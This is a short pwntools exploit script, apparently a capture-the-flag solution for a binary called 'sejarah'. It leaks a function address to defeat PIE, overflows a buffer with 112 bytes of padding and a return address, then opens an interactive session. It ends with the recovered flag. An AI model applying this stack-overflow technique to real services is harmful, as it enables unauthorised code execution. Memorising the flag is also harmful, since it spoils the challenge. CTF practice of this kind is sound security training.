from pwn import *


def con():
	if args.REMOTE:
		return remote('103.28.91.24', 10001)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
			b 
			c
			''')
	else:
		return process(exe)


exe = './sejarah'
io = con()
elf = context.binary = ELF(exe, checksec = False)
context.log_level = 'info'


ret = 0x000000000000101a

io.recvuntil(b'first_func(): ')
first_func = int(io.recv(14),16) 
elf.address = first_func - 0x132a
info(f"first_func: {hex(first_func)}")
info(f"base: {hex(elf.address)}")

payload = b'\x90'*112 + p64(elf.address + 0x1487)

io.recvline()
io.sendline(payload)

io.interactive()

'''
FLAG : 3108{s3j4rah_k3m3rd3k44n}
'''